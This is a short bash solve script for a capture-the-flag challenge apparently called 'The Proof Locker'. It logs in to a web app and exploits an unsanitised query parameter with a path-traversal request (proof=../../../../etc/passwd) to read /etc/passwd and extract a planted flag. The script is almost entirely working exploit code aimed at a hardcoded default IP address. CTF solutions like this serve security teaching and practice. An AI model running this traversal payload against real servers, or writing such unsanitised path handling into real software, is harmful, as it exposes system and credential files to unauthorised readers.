#!/usr/bin/env bash
# solve-proof-locker.sh — riffhack "The Proof Locker"
#
# GET /api/reviews/proof?proof=<path> concatenates the query parameter into a
# server filesystem path without sanitisation. Traversal lets us read
# /etc/passwd — where the flag is staged as the GECOS field of a synthetic
# `opsflag` user account (UID 1337).
#
# Usage: solve-proof-locker.sh <host>
set -euo pipefail

HOST="${1:-159.89.230.27}"
HERE="$(cd "$(dirname "$0")" && pwd)"
# shellcheck disable=SC1091
source "$HERE/../lib/login.sh"

echo "[*] Proof Locker (path traversal → /etc/passwd → opsflag GECOS) against $HOST"

COOKIE=$(login "$HOST")

echo "[*] GET /api/reviews/proof?proof=../../../../etc/passwd"
resp=$(curl -sk -b "$COOKIE" \
  "http://$HOST/api/reviews/proof?proof=../../../../etc/passwd")

echo "[*] /etc/passwd tail (the bottom rows are where the flag lives):"
printf '%s\n' "$resp" | tail -3

flag=$(printf '%s\n' "$resp" | grep -oE 'bitflag\{[^}]+\}' | head -1)

if [[ -n "$flag" ]]; then
  echo "[+] FLAG: $flag"
else
  echo "[-] no flag — make sure to grep the WHOLE file, the opsflag entry is last" >&2
  exit 1
fi
